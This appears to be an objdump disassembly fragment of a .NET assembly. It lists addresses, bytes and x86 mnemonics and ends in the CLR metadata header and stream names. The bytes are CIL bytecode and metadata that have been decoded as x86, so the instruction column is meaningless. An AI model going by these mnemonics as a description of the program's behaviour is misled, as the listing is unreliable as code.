  404104:	de 0b                	fimuls (%ebx)
  404106:	07                   	pop    %es
  404107:	2c 07                	sub    $0x7,%al
  404109:	07                   	pop    %es
  40410a:	6f                   	outsl  %ds:(%esi),(%dx)
  40410b:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  404110:	dc 00                	faddl  (%eax)
  404112:	de 05 26 00 00 de    	fiadds 0xde000026
  404118:	00 2a                	add    %ch,(%edx)
  40411a:	00 00                	add    %al,(%eax)
  40411c:	41                   	inc    %ecx
  40411d:	4c                   	dec    %esp
  40411e:	00 00                	add    %al,(%eax)
  404120:	02 00                	add    (%eax),%al
  404122:	00 00                	add    %al,(%eax)
  404124:	4c                   	dec    %esp
  404125:	00 00                	add    %al,(%eax)
  404127:	00 ea                	add    %ch,%dl
  404129:	00 00                	add    %al,(%eax)
  40412b:	00 36                	add    %dh,(%esi)
  40412d:	01 00                	add    %eax,(%eax)
  40412f:	00 0d 00 00 00 00    	add    %cl,0x0
  404135:	00 00                	add    %al,(%eax)
  404137:	00 02                	add    %al,(%edx)
  404139:	00 00                	add    %al,(%eax)
  40413b:	00 0e                	add    %cl,(%esi)
  40413d:	00 00                	add    %al,(%eax)
  40413f:	00 38                	add    %bh,(%eax)
  404141:	01 00                	add    %eax,(%eax)
  404143:	00 46 01             	add    %al,0x1(%esi)
  404146:	00 00                	add    %al,(%eax)
  404148:	0b 00                	or     (%eax),%eax
	...
  404152:	00 00                	add    %al,(%eax)
  404154:	01 00                	add    %eax,(%eax)
  404156:	00 00                	add    %al,(%eax)
  404158:	53                   	push   %ebx
  404159:	01 00                	add    %eax,(%eax)
  40415b:	00 54 01 00          	add    %dl,0x0(%ecx,%eax,1)
  40415f:	00 05 00 00 00 12    	add    %al,0x12000000
  404165:	00 00                	add    %al,(%eax)
  404167:	01 1b                	add    %ebx,(%ebx)
  404169:	30 04 00             	xor    %al,(%eax,%eax,1)
  40416c:	4e                   	dec    %esi
  40416d:	00 00                	add    %al,(%eax)
  40416f:	00 17                	add    %dl,(%edi)
  404171:	00 00                	add    %al,(%eax)
  404173:	11 00                	adc    %eax,(%eax)
  404175:	00 73 92             	add    %dh,-0x6e(%ebx)
  404178:	00 00                	add    %al,(%eax)
  40417a:	0a 25 72 4a 24 00    	or     0x244a72,%ah
  404180:	70 6f                	jo     0x4041f1
  404182:	93                   	xchg   %eax,%ebx
  404183:	00 00                	add    %al,(%eax)
  404185:	0a 00                	or     (%eax),%al
  404187:	25 72 5a 24 00       	and    $0x245a72,%eax
  40418c:	70 03                	jo     0x404191
  40418e:	28 3f                	sub    %bh,(%edi)
  404190:	00 00                	add    %al,(%eax)
  404192:	0a 6f 94             	or     -0x6c(%edi),%ch
  404195:	00 00                	add    %al,(%eax)
  404197:	0a 00                	or     (%eax),%al
  404199:	25 17 6f 95 00       	and    $0x956f17,%eax
  40419e:	00 0a                	add    %cl,(%edx)
  4041a0:	00 25 17 6f 96 00    	add    %ah,0x966f17
  4041a6:	00 0a                	add    %cl,(%edx)
  4041a8:	00 25 16 6f 97 00    	add    %ah,0x976f16
  4041ae:	00 0a                	add    %cl,(%edx)
  4041b0:	00 0a                	add    %cl,(%edx)
  4041b2:	06                   	push   %es
  4041b3:	28 98 00 00 0a 26    	sub    %bl,0x260a0000(%eax)
  4041b9:	00 de                	add    %bl,%dh
  4041bb:	05 26 00 00 de       	add    $0xde000026,%eax
  4041c0:	00 2a                	add    %ch,(%edx)
  4041c2:	00 00                	add    %al,(%eax)
  4041c4:	01 10                	add    %edx,(%eax)
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	00 00                	add    %al,(%eax)
  4041ca:	01 00                	add    %eax,(%eax)
  4041cc:	47                   	inc    %edi
  4041cd:	48                   	dec    %eax
  4041ce:	00 05 12 00 00 01    	add    %al,0x1000012
  4041d4:	1b 30                	sbb    (%eax),%esi
  4041d6:	05 00 4b 00 00       	add    $0x4b00,%eax
  4041db:	00 17                	add    %dl,(%edi)
  4041dd:	00 00                	add    %al,(%eax)
  4041df:	11 00                	adc    %eax,(%eax)
  4041e1:	00 73 92             	add    %dh,-0x6e(%ebx)
  4041e4:	00 00                	add    %al,(%eax)
  4041e6:	0a 25 72 62 24 00    	or     0x246272,%ah
  4041ec:	70 6f                	jo     0x40425d
  4041ee:	93                   	xchg   %eax,%ebx
  4041ef:	00 00                	add    %al,(%eax)
  4041f1:	0a 00                	or     (%eax),%al
  4041f3:	25 72 80 24 00       	and    $0x248072,%eax
  4041f8:	70 03                	jo     0x4041fd
  4041fa:	72 e8                	jb     0x4041e4
  4041fc:	24 00                	and    $0x0,%al
  4041fe:	70 28                	jo     0x404228
  404200:	3c 00                	cmp    $0x0,%al
  404202:	00 0a                	add    %cl,(%edx)
  404204:	6f                   	outsl  %ds:(%esi),(%dx)
  404205:	94                   	xchg   %eax,%esp
  404206:	00 00                	add    %al,(%eax)
  404208:	0a 00                	or     (%eax),%al
  40420a:	25 17 6f 95 00       	and    $0x956f17,%eax
  40420f:	00 0a                	add    %cl,(%edx)
  404211:	00 25 17 6f 96 00    	add    %ah,0x966f17
  404217:	00 0a                	add    %cl,(%edx)
  404219:	00 0a                	add    %cl,(%edx)
  40421b:	06                   	push   %es
  40421c:	28 98 00 00 0a 26    	sub    %bl,0x260a0000(%eax)
  404222:	00 de                	add    %bl,%dh
  404224:	05 26 00 00 de       	add    $0xde000026,%eax
  404229:	00 2a                	add    %ch,(%edx)
  40422b:	00 01                	add    %al,(%ecx)
  40422d:	10 00                	adc    %al,(%eax)
  40422f:	00 00                	add    %al,(%eax)
  404231:	00 01                	add    %al,(%ecx)
  404233:	00 44 45 00          	add    %al,0x0(%ebp,%eax,2)
  404237:	05 12 00 00 01       	add    $0x1000012,%eax
  40423c:	3a 00                	cmp    (%eax),%al
  40423e:	02 72 ec             	add    -0x14(%edx),%dh
  404241:	24 00                	and    $0x0,%al
  404243:	70 28                	jo     0x40426d
  404245:	32 00                	xor    (%eax),%al
  404247:	00 06                	add    %al,(%esi)
  404249:	00 2a                	add    %ch,(%edx)
  40424b:	00 1b                	add    %bl,(%ebx)
  40424d:	30 03                	xor    %al,(%ebx)
  40424f:	00 99 00 00 00 18    	add    %bl,0x18000000(%ecx)
  404255:	00 00                	add    %al,(%eax)
  404257:	11 00                	adc    %eax,(%eax)
  404259:	00 02                	add    %al,(%edx)
  40425b:	28 1d 00 00 06 00    	sub    %bl,0x60000
  404261:	02 28                	add    (%eax),%ch
  404263:	2d 00 00 06 00       	sub    $0x60000,%eax
  404268:	02 28                	add    (%eax),%ch
  40426a:	2f                   	das
  40426b:	00 00                	add    %al,(%eax)
  40426d:	06                   	push   %es
  40426e:	00 02                	add    %al,(%edx)
  404270:	28 1e                	sub    %bl,(%esi)
  404272:	00 00                	add    %al,(%eax)
  404274:	06                   	push   %es
  404275:	00 02                	add    %al,(%edx)
  404277:	28 1f                	sub    %bl,(%edi)
  404279:	00 00                	add    %al,(%eax)
  40427b:	06                   	push   %es
  40427c:	00 02                	add    %al,(%edx)
  40427e:	28 21                	sub    %ah,(%ecx)
  404280:	00 00                	add    %al,(%eax)
  404282:	06                   	push   %es
  404283:	00 02                	add    %al,(%edx)
  404285:	28 22                	sub    %ah,(%edx)
  404287:	00 00                	add    %al,(%eax)
  404289:	06                   	push   %es
  40428a:	00 02                	add    %al,(%edx)
  40428c:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40428f:	00 06                	add    %al,(%esi)
  404291:	00 02                	add    %al,(%edx)
  404293:	28 25 00 00 06 00    	sub    %ah,0x60000
  404299:	02 28                	add    (%eax),%ch
  40429b:	26 00 00             	add    %al,%es:(%eax)
  40429e:	06                   	push   %es
  40429f:	00 02                	add    %al,(%edx)
  4042a1:	28 27                	sub    %ah,(%edi)
  4042a3:	00 00                	add    %al,(%eax)
  4042a5:	06                   	push   %es
  4042a6:	00 02                	add    %al,(%edx)
  4042a8:	28 28                	sub    %ch,(%eax)
  4042aa:	00 00                	add    %al,(%eax)
  4042ac:	06                   	push   %es
  4042ad:	00 02                	add    %al,(%edx)
  4042af:	28 29                	sub    %ch,(%ecx)
  4042b1:	00 00                	add    %al,(%eax)
  4042b3:	06                   	push   %es
  4042b4:	00 02                	add    %al,(%edx)
  4042b6:	28 23                	sub    %ah,(%ebx)
  4042b8:	00 00                	add    %al,(%eax)
  4042ba:	06                   	push   %es
  4042bb:	00 02                	add    %al,(%edx)
  4042bd:	28 2a                	sub    %ch,(%edx)
  4042bf:	00 00                	add    %al,(%eax)
  4042c1:	06                   	push   %es
  4042c2:	00 02                	add    %al,(%edx)
  4042c4:	28 2b                	sub    %ch,(%ebx)
  4042c6:	00 00                	add    %al,(%eax)
  4042c8:	06                   	push   %es
  4042c9:	00 02                	add    %al,(%edx)
  4042cb:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4042ce:	00 06                	add    %al,(%esi)
  4042d0:	00 00                	add    %al,(%eax)
  4042d2:	de 1c 0a             	ficomps (%edx,%ecx,1)
  4042d5:	00 02                	add    %al,(%edx)
  4042d7:	72 14                	jb     0x4042ed
  4042d9:	25 00 70 06 6f       	and    $0x6f067000,%eax
  4042de:	49                   	dec    %ecx
  4042df:	00 00                	add    %al,(%eax)
  4042e1:	0a 28                	or     (%eax),%ch
  4042e3:	3f                   	aas
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 28                	or     (%eax),%ch
  4042e8:	30 00                	xor    %al,(%eax)
  4042ea:	00 06                	add    %al,(%esi)
  4042ec:	00 00                	add    %al,(%eax)
  4042ee:	de 00                	fiadds (%eax)
  4042f0:	2a 00                	sub    (%eax),%al
  4042f2:	00 00                	add    %al,(%eax)
  4042f4:	01 10                	add    %edx,(%eax)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	00 00                	add    %al,(%eax)
  4042fa:	01 00                	add    %eax,(%eax)
  4042fc:	7b 7c                	jnp    0x40437a
  4042fe:	00 1c 1d 00 00 01 13 	add    %bl,0x13010000(,%ebx,1)
  404305:	30 04 00             	xor    %al,(%eax,%eax,1)
  404308:	4f                   	dec    %edi
  404309:	00 00                	add    %al,(%eax)
  40430b:	00 19                	add    %bl,(%ecx)
  40430d:	00 00                	add    %al,(%eax)
  40430f:	11 00                	adc    %eax,(%eax)
  404311:	2b 48 00             	sub    0x0(%eax),%ecx
  404314:	16                   	push   %ss
  404315:	0a 2b                	or     (%ebx),%ch
  404317:	31 02                	xor    %eax,(%edx)
  404319:	7b 0a                	jnp    0x404325
  40431b:	00 00                	add    %al,(%eax)
  40431d:	04 20                	add    $0x20,%al
  40431f:	c8 00 00 00          	enter  $0x0,$0x0
  404323:	20 d0                	and    %dl,%al
  404325:	07                   	pop    %es
  404326:	00 00                	add    %al,(%eax)
  404328:	6f                   	outsl  %ds:(%esi),(%dx)
  404329:	58                   	pop    %eax
  40432a:	00 00                	add    %al,(%eax)
  40432c:	0a 02                	or     (%edx),%al
  40432e:	7b 0a                	jnp    0x40433a
  404330:	00 00                	add    %al,(%eax)
  404332:	04 1f                	add    $0x1f,%al
  404334:	64 20 20             	and    %ah,%fs:(%eax)
  404337:	03 00                	add    (%eax),%eax
  404339:	00 6f 58             	add    %ch,0x58(%edi)
  40433c:	00 00                	add    %al,(%eax)
  40433e:	0a 28                	or     (%eax),%ch
  404340:	99                   	cltd
  404341:	00 00                	add    %al,(%eax)
  404343:	0a 00                	or     (%eax),%al
  404345:	06                   	push   %es
  404346:	17                   	pop    %ss
  404347:	58                   	pop    %eax
  404348:	0a 06                	or     (%esi),%al
  40434a:	1f                   	pop    %ds
  40434b:	32 fe                	xor    %dh,%bh
  40434d:	04 0b                	add    $0xb,%al
  40434f:	07                   	pop    %es
  404350:	2d c6 1f 64 28       	sub    $0x28641fc6,%eax
  404355:	37                   	aaa
  404356:	00 00                	add    %al,(%eax)
  404358:	0a 00                	or     (%eax),%al
  40435a:	00 17                	add    %dl,(%edi)
  40435c:	0c 2b                	or     $0x2b,%al
  40435e:	b4 62                	mov    $0x62,%ah
  404360:	03 02                	add    (%edx),%eax
  404362:	7b 0a                	jnp    0x40436e
  404364:	00 00                	add    %al,(%eax)
  404366:	04 03                	add    $0x3,%al
  404368:	6f                   	outsl  %ds:(%esi),(%dx)
  404369:	8e 00                	mov    (%eax),%es
  40436b:	00 0a                	add    %cl,(%edx)
  40436d:	6f                   	outsl  %ds:(%esi),(%dx)
  40436e:	9a 00 00 0a 6f 9b 00 	lcall  $0x9b,$0x6f0a0000
  404375:	00 0a                	add    %cl,(%edx)
  404377:	2a 26                	sub    (%esi),%ah
  404379:	02 28                	add    (%eax),%ch
  40437b:	1a 00                	sbb    (%eax),%al
  40437d:	00 0a                	add    %cl,(%edx)
  40437f:	00 00                	add    %al,(%eax)
  404381:	2a 00                	sub    (%eax),%al
  404383:	00 13                	add    %dl,(%ebx)
  404385:	30 02                	xor    %al,(%edx)
  404387:	00 39                	add    %bh,(%ecx)
  404389:	00 00                	add    %al,(%eax)
  40438b:	00 1a                	add    %bl,(%edx)
  40438d:	00 00                	add    %al,(%eax)
  40438f:	11 00                	adc    %eax,(%eax)
  404391:	7e 0d                	jle    0x4043a0
  404393:	00 00                	add    %al,(%eax)
  404395:	04 14                	add    $0x14,%al
  404397:	fe 01                	incb   (%ecx)
  404399:	0a 06                	or     (%esi),%al
  40439b:	2c 22                	sub    $0x22,%al
  40439d:	00 72 24             	add    %dh,0x24(%edx)
  4043a0:	25 00 70 d0 05       	and    $0x5d07000,%eax
  4043a5:	00 00                	add    %al,(%eax)
  4043a7:	02 28                	add    (%eax),%ch
  4043a9:	9c                   	pushf
  4043aa:	00 00                	add    %al,(%eax)
  4043ac:	0a 6f 9d             	or     -0x63(%edi),%ch
  4043af:	00 00                	add    %al,(%eax)
  4043b1:	0a 73 9e             	or     -0x62(%ebx),%dh
  4043b4:	00 00                	add    %al,(%eax)
  4043b6:	0a 0b                	or     (%ebx),%cl
  4043b8:	07                   	pop    %es
  4043b9:	80 0d 00 00 04 00 7e 	orb    $0x7e,0x40000
  4043c0:	0d 00 00 04 0c       	or     $0xc040000,%eax
  4043c5:	2b 00                	sub    (%eax),%eax
  4043c7:	08 2a                	or     %ch,(%edx)
  4043c9:	00 00                	add    %al,(%eax)
  4043cb:	00 13                	add    %dl,(%ebx)
  4043cd:	30 01                	xor    %al,(%ecx)
  4043cf:	00 0b                	add    %cl,(%ebx)
  4043d1:	00 00                	add    %al,(%eax)
  4043d3:	00 1b                	add    %bl,(%ebx)
  4043d5:	00 00                	add    %al,(%eax)
  4043d7:	11 00                	adc    %eax,(%eax)
  4043d9:	7e 0e                	jle    0x4043e9
  4043db:	00 00                	add    %al,(%eax)
  4043dd:	04 0a                	add    $0xa,%al
  4043df:	2b 00                	sub    (%eax),%eax
  4043e1:	06                   	push   %es
  4043e2:	2a 22                	sub    (%edx),%ah
  4043e4:	00 02                	add    %al,(%edx)
  4043e6:	80 0e 00             	orb    $0x0,(%esi)
  4043e9:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4043ec:	13 30                	adc    (%eax),%esi
  4043ee:	01 00                	add    %eax,(%eax)
  4043f0:	0b 00                	or     (%eax),%eax
  4043f2:	00 00                	add    %al,(%eax)
  4043f4:	1c 00                	sbb    $0x0,%al
  4043f6:	00 11                	add    %dl,(%ecx)
  4043f8:	00 7e 0f             	add    %bh,0xf(%esi)
  4043fb:	00 00                	add    %al,(%eax)
  4043fd:	04 0a                	add    $0xa,%al
  4043ff:	2b 00                	sub    (%eax),%eax
  404401:	06                   	push   %es
  404402:	2a 22                	sub    (%edx),%ah
  404404:	02 28                	add    (%eax),%ch
  404406:	9f                   	lahf
  404407:	00 00                	add    %al,(%eax)
  404409:	0a 00                	or     (%eax),%al
  40440b:	2a 56 73             	sub    0x73(%esi),%dl
  40440e:	3d 00 00 06 28       	cmp    $0x28060000,%eax
  404413:	a0 00 00 0a 74       	mov    0x740a0000,%al
  404418:	06                   	push   %es
  404419:	00 00                	add    %al,(%eax)
  40441b:	02 80 0f 00 00 04    	add    0x400000f(%eax),%al
  404421:	2a 2e                	sub    (%esi),%ch
  404423:	73 40                	jae    0x404465
  404425:	00 00                	add    %al,(%eax)
  404427:	06                   	push   %es
  404428:	80 10 00             	adcb   $0x0,(%eax)
  40442b:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40442e:	22 02                	and    (%edx),%al
  404430:	28 1a                	sub    %bl,(%edx)
  404432:	00 00                	add    %al,(%eax)
  404434:	0a 00                	or     (%eax),%al
  404436:	2a 00                	sub    (%eax),%al
  404438:	13 30                	adc    (%eax),%esi
  40443a:	03 00                	add    (%eax),%eax
  40443c:	3f                   	aas
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 1d 00 00 11 00    	add    %bl,0x110000
  404445:	2b 38                	sub    (%eax),%edi
  404447:	00 28                	add    %ch,(%eax)
  404449:	7d 00                	jge    0x40444b
  40444b:	00 0a                	add    %cl,(%edx)
  40444d:	6f                   	outsl  %ds:(%esi),(%dx)
  40444e:	7e 00                	jle    0x404450
  404450:	00 0a                	add    %cl,(%edx)
  404452:	0a 12                	or     (%edx),%dl
  404454:	00 28                	add    %ch,(%eax)
  404456:	7f 00                	jg     0x404458
  404458:	00 0a                	add    %cl,(%edx)
  40445a:	18 5b 28             	sbb    %bl,0x28(%ebx)
  40445d:	7d 00                	jge    0x40445f
  40445f:	00 0a                	add    %cl,(%edx)
  404461:	6f                   	outsl  %ds:(%esi),(%dx)
  404462:	7e 00                	jle    0x404464
  404464:	00 0a                	add    %cl,(%edx)
  404466:	0a 12                	or     (%edx),%dl
  404468:	00 28                	add    %ch,(%eax)
  40446a:	80 00 00             	addb   $0x0,(%eax)
  40446d:	0a 18                	or     (%eax),%bl
  40446f:	5b                   	pop    %ebx
  404470:	28 0e                	sub    %cl,(%esi)
  404472:	00 00                	add    %al,(%eax)
  404474:	06                   	push   %es
  404475:	26 1f                	es pop %ds
  404477:	0a 28                	or     (%eax),%ch
  404479:	37                   	aaa
  40447a:	00 00                	add    %al,(%eax)
  40447c:	0a 00                	or     (%eax),%al
  40447e:	00 17                	add    %dl,(%edi)
  404480:	0b 2b                	or     (%ebx),%ebp
  404482:	c4 00                	les    (%eax),%eax
  404484:	42                   	inc    %edx
  404485:	53                   	push   %ebx
  404486:	4a                   	dec    %edx
  404487:	42                   	inc    %edx
  404488:	01 00                	add    %eax,(%eax)
  40448a:	01 00                	add    %eax,(%eax)
  40448c:	00 00                	add    %al,(%eax)
  40448e:	00 00                	add    %al,(%eax)
  404490:	0c 00                	or     $0x0,%al
  404492:	00 00                	add    %al,(%eax)
  404494:	76 34                	jbe    0x4044ca
  404496:	2e 30 2e             	xor    %ch,%cs:(%esi)
  404499:	33 30                	xor    (%eax),%esi
  40449b:	33 31                	xor    (%ecx),%esi
  40449d:	39 00                	cmp    %eax,(%eax)
  40449f:	00 00                	add    %al,(%eax)
  4044a1:	00 05 00 6c 00 00    	add    %al,0x6c00
  4044a7:	00 dc                	add    %bl,%ah
  4044a9:	0d 00 00 23 7e       	or     $0x7e230000,%eax
  4044ae:	00 00                	add    %al,(%eax)
  4044b0:	48                   	dec    %eax
  4044b1:	0e                   	push   %cs
  4044b2:	00 00                	add    %al,(%eax)
  4044b4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4044b5:	10 00                	adc    %al,(%eax)
  4044b7:	00 23                	add    %ah,(%ebx)
  4044b9:	53                   	push   %ebx
  4044ba:	74 72                	je     0x40452e
  4044bc:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  4044c3:	00 ec                	add    %ch,%ah
  4044c5:	1e                   	push   %ds
  4044c6:	00 00                	add    %al,(%eax)
  4044c8:	64 25 00 00 23 55    	fs and $0x55230000,%eax
  4044ce:	53                   	push   %ebx
  4044cf:	00 50 44             	add    %dl,0x44(%eax)
  4044d2:	00 00                	add    %al,(%eax)
  4044d4:	10 00                	adc    %al,(%eax)
  4044d6:	00 00                	add    %al,(%eax)
  4044d8:	23 47 55             	and    0x55(%edi),%eax
  4044db:	49                   	dec    %ecx
  4044dc:	44                   	inc    %esp
  4044dd:	00 00                	add    %al,(%eax)
  4044df:	00 60 44             	add    %ah,0x44(%eax)
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	80 07 00             	addb   $0x0,(%edi)
  4044e7:	00 23                	add    %ah,(%ebx)
  4044e9:	42                   	inc    %edx
  4044ea:	6c                   	insb   (%dx),%es:(%edi)
  4044eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4044ec:	62 00                	bound  %eax,(%eax)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	00 00                	add    %al,(%eax)
  4044f2:	00 00                	add    %al,(%eax)
  4044f4:	02 00                	add    (%eax),%al
  4044f6:	00 01                	add    %al,(%ecx)
  4044f8:	57                   	push   %edi
  4044f9:	1d a2 1d 09 0f       	sbb    $0xf091da2,%eax
  4044fe:	00 00                	add    %al,(%eax)
  404500:	00 fa                	add    %bh,%dl
  404502:	01 33                	add    %esi,(%ebx)
  404504:	00 16                	add    %dl,(%esi)
  404506:	00 00                	add    %al,(%eax)
  404508:	01 00                	add    %eax,(%eax)
  40450a:	00 00                	add    %al,(%eax)
  40450c:	5e                   	pop    %esi
  40450d:	00 00                	add    %al,(%eax)
  40450f:	00 07                	add    %al,(%edi)
  404511:	00 00                	add    %al,(%eax)
  404513:	00 11                	add    %dl,(%ecx)
  404515:	00 00                	add    %al,(%eax)
  404517:	00 41 00             	add    %al,0x0(%ecx)
  40451a:	00 00                	add    %al,(%eax)
  40451c:	17                   	pop    %ss
  40451d:	00 00                	add    %al,(%eax)
  40451f:	00 a0 00 00 00 06    	add    %ah,0x6000000(%eax)
  404525:	00 00                	add    %al,(%eax)
  404527:	00 23                	add    %ah,(%ebx)
  404529:	00 00                	add    %al,(%eax)
  40452b:	00 1d 00 00 00 03    	add    %bl,0x3000000
  404531:	00 00                	add    %al,(%eax)
  404533:	00 06                	add    %al,(%esi)
  404535:	00 00                	add    %al,(%eax)
  404537:	00 07                	add    %al,(%edi)
  404539:	00 00                	add    %al,(%eax)
  40453b:	00 02                	add    %al,(%edx)
  40453d:	00 00                	add    %al,(%eax)
  40453f:	00 0b                	add    %cl,(%ebx)
  404541:	00 00                	add    %al,(%eax)
  404543:	00 07                	add    %al,(%edi)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 01                	add    %al,(%ecx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	00 05 00 00 00 01    	add    %al,0x1000000
  404551:	00 00                	add    %al,(%eax)
  404553:	00 01                	add    %al,(%ecx)
  404555:	00 00                	add    %al,(%eax)
  404557:	00 03                	add    %al,(%ebx)
  404559:	00 00                	add    %al,(%eax)
  40455b:	00 03                	add    %al,(%ebx)
  40455d:	00 00                	add    %al,(%eax)
  40455f:	00 00                	add    %al,(%eax)
  404561:	00 7d 07             	add    %bh,0x7(%ebp)
  404564:	01 00                	add    %eax,(%eax)
  404566:	00 00                	add    %al,(%eax)
  404568:	00 00                	add    %al,(%eax)
  40456a:	06                   	push   %es
  40456b:	00 a8 06 b8 0c 06    	add    %ch,0x60cb806(%eax)
  404571:	00 2e                	add    %ch,(%esi)
  404573:	07                   	pop    %es
  404574:	b8 0c 06 00 90       	mov    $0x9000060c,%eax
  404579:	05 69 0c 0f 00       	add    $0xf0c69,%eax
  40457e:	13 0d 00 00 06 00    	adc    0x60000,%ecx
  404584:	ec                   	in     (%dx),%al
  404585:	05 62 0a 06 00       	add    $0x60a62,%eax
  40458a:	8b 06                	mov    (%esi),%eax
  40458c:	62 0a                	bound  %ecx,(%edx)
  40458e:	06                   	push   %es
  40458f:	00 6c 06 62          	add    %ch,0x62(%esi,%eax,1)
  404593:	0a 06                	or     (%esi),%al
  404595:	00 15 07 62 0a 06    	add    %dl,0x60a6207
  40459b:	00 c8                	add    %cl,%al
  40459d:	06                   	push   %es
  40459e:	62 0a                	bound  %ecx,(%edx)
  4045a0:	06                   	push   %es
  4045a1:	00 e1                	add    %ah,%cl
  4045a3:	06                   	push   %es
  4045a4:	62 0a                	bound  %ecx,(%edx)
  4045a6:	06                   	push   %es
  4045a7:	00 03                	add    %al,(%ebx)
  4045a9:	06                   	push   %es
  4045aa:	62 0a                	bound  %ecx,(%edx)
  4045ac:	06                   	push   %es
  4045ad:	00 d8                	add    %bl,%al
  4045af:	05 99 0c 06 00       	add    $0x60c99,%eax
  4045b4:	4e                   	dec    %esi
  4045b5:	05 99 0c 06 00       	add    $0x60c99,%eax
  4045ba:	4f                   	dec    %edi
  4045bb:	06                   	push   %es
  4045bc:	62 0a                	bound  %ecx,(%edx)
  4045be:	06                   	push   %es
  4045bf:	00 1e                	add    %bl,(%esi)
  4045c1:	06                   	push   %es
  4045c2:	d7                   	xlat   %ds:(%ebx)
  4045c3:	07                   	pop    %es
  4045c4:	06                   	push   %es
  4045c5:	00 33                	add    %dh,(%ebx)
  4045c7:	05 b8 0c 06 00       	add    $0x60cb8,%eax
  4045cc:	fc                   	cld
  4045cd:	06                   	push   %es
  4045ce:	69 0c 06 00 aa 0e bd 	imul   $0xbd0eaa00,(%esi,%eax,1),%ecx
  4045d5:	09 06                	or     %eax,(%esi)
  4045d7:	00 c7                	add    %al,%bh
  4045d9:	04 69                	add    $0x69,%al
  4045db:	0c 06                	or     $0x6,%al
  4045dd:	00 a4 05 69 0c 06 00 	add    %ah,0x60c69(%ebp,%eax,1)
  4045e4:	37                   	aaa
  4045e5:	06                   	push   %es
  4045e6:	69 0c 06 00 20 05 bd 	imul   $0xbd052000,(%esi,%eax,1),%ecx
  4045ed:	09 06                	or     %eax,(%esi)
  4045ef:	00 61 10             	add    %ah,0x10(%ecx)
  4045f2:	a3 00 0a 00 d0       	mov    %eax,0xd0000a00
  4045f7:	09 e3                	or     %esp,%ebx
  4045f9:	0d 06 00 c9 09       	or     $0x9c90006,%eax
  4045fe:	bd 09 0e 00 87       	mov    $0x87000e09,%ebp
  404603:	0c b8                	or     $0xb8,%al
  404605:	0e                   	push   %cs
  404606:	06                   	push   %es
  404607:	00 6c 03 56          	add    %ch,0x56(%ebx,%eax,1)
  40460b:	01 06                	add    %eax,(%esi)
  40460d:	00 f5                	add    %dh,%ch
  40460f:	01 bd 09 06 00 9a    	add    %edi,-0x65fff9f7(%ebp)
  404615:	0a bd 09 06 00 c6    	or     -0x39fff9f7(%ebp),%bh
  40461b:	01 a6 07 06 00 96    	add    %esp,-0x69fff9f9(%esi)
  404621:	00 99 01 7f 00 48    	add    %bl,0x48007f01(%ecx)
  404627:	0c 00                	or     $0x0,%al
  404629:	00 0e                	add    %cl,(%esi)
  40462b:	00 5f 0e             	add    %bl,0xe(%edi)
  40462e:	69 0c 12 00 fe 0a 1e 	imul   $0x1e0afe00,(%edx,%edx,1),%ecx
  404635:	08 12                	or     %dl,(%edx)
  404637:	00 60 0c             	add    %ah,0xc(%eax)
  40463a:	1e                   	push   %ds
  40463b:	08 0a                	or     %cl,(%edx)
  40463d:	00 ea                	add    %ch,%dl
  40463f:	08 e3                	or     %ah,%bl
  404641:	0d 0e 00 09 0f       	or     $0xf09000e,%eax
  404646:	b8 0e 12 00 51       	mov    $0x5100120e,%eax
  40464b:	03 1e                	add    (%esi),%ebx
  40464d:	08 06                	or     %al,(%esi)
  40464f:	00 1c 04             	add    %bl,(%esp,%eax,1)
  404652:	bd 09 06 00 56       	mov    $0x56000609,%ebp
  404657:	09 56 01             	or     %edx,0x1(%esi)
  40465a:	0e                   	push   %cs
  40465b:	00 ed                	add    %ch,%ch
  40465d:	0a 69 0c             	or     0xc(%ecx),%ch
  404660:	06                   	push   %es
  404661:	00 6a 0f             	add    %ch,0xf(%edx)
  404664:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404665:	07                   	pop    %es
  404666:	0e                   	push   %cs
  404667:	00 5c 05 e8          	add    %bl,-0x18(%ebp,%eax,1)
  40466b:	0b 06                	or     (%esi),%eax
  40466d:	00 73 05             	add    %dh,0x5(%ebx)
  404670:	69 0c 06 00 c7 0b d8 	imul   $0xd80bc700,(%esi,%eax,1),%ecx
  404677:	0c 06                	or     $0x6,%al
  404679:	00 bd 0a 44 0a 0e    	add    %bh,0xe0a440a(%ebp)
  40467f:	00 de                	add    %bl,%dh
  404681:	04 f0                	add    $0xf0,%al
  404683:	08 0e                	or     %cl,(%esi)
  404685:	00 bf 05 f0 08 0e    	add    %bh,0xe08f005(%edi)
  40468b:	00 94 04 2f 0a 06 00 	add    %dl,0x60a2f(%esp,%eax,1)
  404692:	83 00 99             	addl   $0xffffff99,(%eax)
  404695:	01 06                	add    %eax,(%esi)
  404697:	00 17                	add    %dl,(%edi)
  404699:	08 bd 09 06 00 91    	or     %bh,-0x6efff9f7(%ebp)
  40469f:	0b bd 09 0a 00 23    	or     0x23000a09(%ebp),%edi
  4046a5:	0a e3                	or     %bl,%ah
  4046a7:	0d 06 00 8e 10       	or     $0x108e0006,%eax
  4046ac:	a3 00 06 00 21       	mov    %eax,0x21000600
  4046b1:	03 bd 09 06 00 8e    	add    -0x71fff9f7(%ebp),%edi
  4046b7:	08 56 01             	or     %dl,0x1(%esi)
  4046ba:	0a 00                	or     (%eax),%al
  4046bc:	03 05 e3 0d 0a 00    	add    0xa0de3,%eax
  4046c2:	87 03                	xchg   %eax,(%ebx)
  4046c4:	e3 0d                	jecxz  0x4046d3
  4046c6:	06                   	push   %es
  4046c7:	00 b4 00 bd 09 06 00 	add    %dh,0x609bd(%eax,%eax,1)
  4046ce:	51                   	push   %ecx
  4046cf:	02 a3 00 06 00 24    	add    0x24000600(%ebx),%ah
  4046d5:	0f bd 09             	bsr    (%ecx),%ecx
  4046d8:	f7 00 a1 0b 00 00    	testl  $0xba1,(%eax)
